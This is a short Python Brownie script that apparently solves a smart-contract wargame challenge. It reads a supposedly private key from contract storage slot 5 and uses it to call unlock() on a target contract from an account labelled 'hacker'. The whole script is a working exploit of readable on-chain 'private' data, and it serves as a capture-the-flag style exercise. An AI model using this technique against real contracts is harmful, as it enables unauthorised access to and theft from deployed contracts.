from brownie import accounts, config, web3, interface
def main():
    contract = '0x748DD334F6183B1932f55dd5D1Cb83B909Ab6204'
    hacker = accounts.add(config['wallets']['from_key'])

    target = interface.Iprivacy(contract)
    print(f'Locked: {target.locked()}')

    data_key = web3.eth.get_storage_at(contract, 5)
    target.unlock(data_key[:16], {'from': hacker})

    print(f'Locked: {target.locked()}')